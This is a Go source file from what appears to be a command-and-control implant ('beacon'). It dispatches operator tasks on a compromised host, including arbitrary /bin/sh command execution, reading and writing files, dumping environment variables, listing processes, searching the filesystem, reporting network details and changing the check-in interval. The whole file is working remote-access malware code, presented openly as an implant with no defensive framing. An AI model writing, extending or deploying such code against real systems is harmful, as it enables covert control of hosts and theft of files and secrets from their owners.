package beacon

import (
	"bufio"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

// The limits of the work a task may do.
//
// The output of a task travels in one frame, and a frame carries at most
// a megabyte, so the output is cut here and the operator is told that it
// was cut.
const (
	maxTaskOutput = 512 << 10
	maxFileRead   = 8 << 20
	maxFindHits   = 2000
	taskTimeout   = 120 * time.Second
)

// errUnknownKind is the answer to a task kind this implant does not
// know.  The operator has to see that the task did not run, so the
// answer is an error and not a silence.
var errUnknownKind = errors.New("this implant does not know the task kind")

// Outcome is the result of a task.
type Outcome struct {
	// Code is the exit code of the work.
	Code int
	// Out is the output of the work.
	Out []byte
	// Err is the reason the work failed.
	Err string
	// Extra are the fields the operator sees next to the output.
	Extra map[string]any
}

// Capabilities is the list of the task kinds this implant can run.
//
// The server refuses to queue work that is not on this list, so the list
// and the table in runTask have to agree: the test in this package walks
// the table and compares the two, and the operator sees the list in the
// inventory of the host.
func Capabilities() []any {
	kinds := []string{
		"cat",
		"env",
		"exit",
		"find",
		"hash",
		"ls",
		"netinfo",
		"ping",
		"ps",
		"pwd",
		"resolve",
		"shell",
		"sleep",
		"sysinfo",
		"tail",
		"upload",
	}
	out := make([]any, 0, len(kinds))
	for _, kind := range kinds {
		out = append(out, kind)
	}
	return out
}

// runTask runs one task.
//
// A kind this implant does not know is answered with an error instead of
// being ignored: the operator has to see that the task did not run.
func (b *Beacon) runTask(kind string, args map[string]any) Outcome {
	switch kind {
	case "shell":
		return b.taskShell(args)
	case "sysinfo":
		return b.taskSysinfo(args)
	case "ls":
		return b.taskLS(args)
	case "cat":
		return b.taskCat(args)
	case "tail":
		return b.taskTail(args)
	case "upload":
		return b.taskUpload(args)
	case "hash":
		return b.taskHash(args)
	case "ps":
		return b.taskPS(args)
	case "env":
		return b.taskEnv(args)
	case "find":
		return b.taskFind(args)
	case "pwd":
		return b.taskPwd(args)
	case "resolve":
		return b.taskResolve(args)
	case "netinfo":
		return b.taskNetinfo(args)
	case "sleep":
		return b.taskSleep(args)
	case "ping":
		return b.taskPing(args)
	case "exit":
		return b.taskExit(args)
	default:
		return Outcome{Code: 127, Err: fmt.Sprintf("%s %q", errUnknownKind.Error(), kind)}
	}
}

// taskShell runs a command through the shell of the host.
func (b *Beacon) taskShell(args map[string]any) Outcome {
	cmdline := strOr(args, "cmd", "")
	if cmdline == "" {
		return Outcome{Code: 2, Err: "the shell task needs a cmd argument"}
	}
	if runtime.GOOS == "windows" {
		return Outcome{Code: 2, Err: "the shell task of this implant needs a POSIX shell"}
	}
	ctx, cancel := context.WithTimeout(context.Background(), taskTimeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", cmdline)
	out, err := cmd.CombinedOutput()
	out, truncated := capOutput(out)
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			return Outcome{Code: exitErr.ExitCode(), Out: out, Extra: extraIf(truncated, "truncated", true)}
		}
		return Outcome{Code: 1, Out: out, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: out, Extra: extraIf(truncated, "truncated", true)}
}

// taskSysinfo describes the host the implant runs on.
func (b *Beacon) taskSysinfo(args map[string]any) Outcome {
	inventory := Inventory()
	encoded, err := jsonBytes(inventory)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: encoded}
}

// taskLS lists a directory.
func (b *Beacon) taskLS(args map[string]any) Outcome {
	dir := strOr(args, "path", ".")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	type entry struct {
		Name    string `json:"name"`
		Size    int64  `json:"size"`
		Mode    string `json:"mode"`
		ModTime string `json:"modified"`
		IsDir   bool   `json:"dir"`
	}
	list := make([]entry, 0, len(entries))
	for _, item := range entries {
		info, err := item.Info()
		if err != nil {
			continue
		}
		list = append(list, entry{
			Name:    item.Name(),
			Size:    info.Size(),
			Mode:    info.Mode().String(),
			ModTime: info.ModTime().UTC().Format(time.RFC3339),
			IsDir:   item.IsDir(),
		})
	}
	encoded, err := jsonBytes(list)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: encoded, Extra: map[string]any{"path": dir, "count": uint64(len(list))}}
}

// taskCat reads a file.
func (b *Beacon) taskCat(args map[string]any) Outcome {
	path := strOr(args, "path", "")
	if path == "" {
		return Outcome{Code: 2, Err: "the cat task needs a path argument"}
	}
	data, err := readLimited(path, maxFileRead)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	out, truncated := capOutput(data)
	return Outcome{Code: 0, Out: out, Extra: map[string]any{"path": path, "size": uint64(len(data)), "truncated": truncated}}
}

// taskTail reads the last lines of a file.
func (b *Beacon) taskTail(args map[string]any) Outcome {
	path := strOr(args, "path", "")
	if path == "" {
		return Outcome{Code: 2, Err: "the tail task needs a path argument"}
	}
	lines := int(u64Or(args, "lines", 20))
	if lines <= 0 {
		lines = 20
	}
	file, err := os.Open(path)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 0, 64<<10), 1<<20)
	ring := make([]string, 0, lines)
	for scanner.Scan() {
		if len(ring) == lines {
			ring = ring[1:]
		}
		ring = append(ring, scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	out := []byte(strings.Join(ring, "\n"))
	if len(out) > 0 {
		out = append(out, '\n')
	}
	return Outcome{Code: 0, Out: out, Extra: map[string]any{"path": path, "lines": uint64(lines)}}
}

// taskUpload writes a file on the host.
func (b *Beacon) taskUpload(args map[string]any) Outcome {
	path := strOr(args, "path", "")
	if path == "" {
		return Outcome{Code: 2, Err: "the upload task needs a path argument"}
	}
	data := binaryArg(args, "data")
	mode := os.FileMode(u64Or(args, "mode", 0o600))
	if mode == 0 {
		mode = 0o600
	}
	if dir := filepath.Dir(path); dir != "" {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return Outcome{Code: 1, Err: err.Error()}
		}
	}
	if err := os.WriteFile(path, data, mode); err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: []byte("written\n"), Extra: map[string]any{"path": path, "size": uint64(len(data))}}
}

// taskHash is the SHA-256 of a file.
func (b *Beacon) taskHash(args map[string]any) Outcome {
	path := strOr(args, "path", "")
	if path == "" {
		return Outcome{Code: 2, Err: "the hash task needs a path argument"}
	}
	file, err := os.Open(path)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	defer file.Close()
	digest := sha256.New()
	if _, err := io.Copy(digest, io.LimitReader(file, maxFileRead)); err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	sum := hex.EncodeToString(digest.Sum(nil))
	return Outcome{Code: 0, Out: []byte(sum + "  " + path + "\n"), Extra: map[string]any{"path": path, "sha256": sum}}
}

// taskPS is the table of the processes of the host.
//
// The table of the processes is not part of the standard library, so it
// is read from the process table of the system: /proc on Linux, the
// process list of the system on the other systems.  When the host does
// not expose one, the implant says so instead of making one up.
func (b *Beacon) taskPS(args map[string]any) Outcome {
	procs, source, note := processList()
	if procs == nil {
		return Outcome{Code: 1, Err: note, Extra: map[string]any{"source": source}}
	}
	encoded, err := jsonBytes(procs)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	extra := map[string]any{"source": source, "count": uint64(len(procs))}
	if note != "" {
		extra["note"] = note
	}
	return Outcome{Code: 0, Out: encoded, Extra: extra}
}

// taskEnv is the environment of the implant.
func (b *Beacon) taskEnv(args map[string]any) Outcome {
	env := os.Environ()
	sort.Strings(env)
	out := []byte(strings.Join(env, "\n"))
	if len(out) > 0 {
		out = append(out, '\n')
	}
	return Outcome{Code: 0, Out: out, Extra: map[string]any{"count": uint64(len(env))}}
}

// taskFind looks for the files whose name matches a pattern.
func (b *Beacon) taskFind(args map[string]any) Outcome {
	root := strOr(args, "path", ".")
	pattern := strOr(args, "pattern", "*")
	limit := int(u64Or(args, "limit", uint64(maxFindHits)))
	if limit <= 0 || limit > maxFindHits {
		limit = maxFindHits
	}
	hits := make([]string, 0, 64)
	truncated := false
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if len(hits) >= limit {
			truncated = true
			return filepath.SkipDir
		}
		name := info.Name()
		if ok, _ := filepath.Match(pattern, name); ok {
			hits = append(hits, path)
		}
		return nil
	})
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	sort.Strings(hits)
	out := []byte(strings.Join(hits, "\n"))
	if len(out) > 0 {
		out = append(out, '\n')
	}
	return Outcome{Code: 0, Out: out, Extra: map[string]any{"path": root, "pattern": pattern, "count": uint64(len(hits)), "truncated": truncated}}
}

// taskPwd is the working directory of the implant.
func (b *Beacon) taskPwd(args map[string]any) Outcome {
	dir, err := os.Getwd()
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: []byte(dir + "\n"), Extra: map[string]any{"path": dir}}
}

// taskResolve looks a name up in the resolver of the host.
func (b *Beacon) taskResolve(args map[string]any) Outcome {
	name := strOr(args, "name", "")
	if name == "" {
		return Outcome{Code: 2, Err: "the resolve task needs a name argument"}
	}
	addrs, err := lookupHost(name)
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	out := []byte(strings.Join(addrs, "\n"))
	if len(out) > 0 {
		out = append(out, '\n')
	}
	return Outcome{Code: 0, Out: out, Extra: map[string]any{"name": name, "count": uint64(len(addrs))}}
}

// taskNetinfo describes the network of the host.
func (b *Beacon) taskNetinfo(args map[string]any) Outcome {
	encoded, err := jsonBytes(NetworkInfo())
	if err != nil {
		return Outcome{Code: 1, Err: err.Error()}
	}
	return Outcome{Code: 0, Out: encoded}
}

// taskSleep changes the interval between two check-ins.
func (b *Beacon) taskSleep(args map[string]any) Outcome {
	seconds := u64Or(args, "seconds", 0)
	if seconds == 0 {
		seconds = u64Or(args, "sleep", 0)
	}
	if seconds == 0 {
		return Outcome{Code: 2, Err: "the sleep task needs a seconds argument"}
	}
	if seconds > 86400 {
		seconds = 86400
	}
	b.cfg.Sleep = time.Duration(seconds) * time.Second
	return Outcome{Code: 0, Out: []byte(fmt.Sprintf("sleep interval updated: %d seconds\n", seconds)),
		Extra: map[string]any{"sleep": seconds}}
}

// taskPing is the answer of a host that is alive.
func (b *Beacon) taskPing(args map[string]any) Outcome {
	return Outcome{Code: 0, Out: []byte("pong\n"),
		Extra: map[string]any{"up": uint64(time.Since(b.started).Seconds()), "iver": Version}}
}

// taskExit stops the implant.
func (b *Beacon) taskExit(args map[string]any) Outcome {
	reason := strOr(args, "reason", "the operator asked the implant to stop")
	b.stop = true
	return Outcome{Code: 0, Out: []byte("stopping\n"), Extra: map[string]any{"reason": reason}}
}

// binaryArg reads an argument that carries bytes: it is either the
// binary form or the text form of the same thing.
func binaryArg(args map[string]any, key string) []byte {
	if args == nil {
		return nil
	}
	switch v := args[key].(type) {
	case []byte:
		return v
	case string:
		return []byte(v)
	}
	return nil
}

// capOutput cuts an output that is too long for one frame.
func capOutput(data []byte) ([]byte, bool) {
	if len(data) <= maxTaskOutput {
		return data, false
	}
	return data[:maxTaskOutput], true
}

// extraIf builds the extra fields of an outcome when the condition holds.
func extraIf(cond bool, key string, value any) map[string]any {
	if !cond {
		return nil
	}
	return map[string]any{key: value}
}
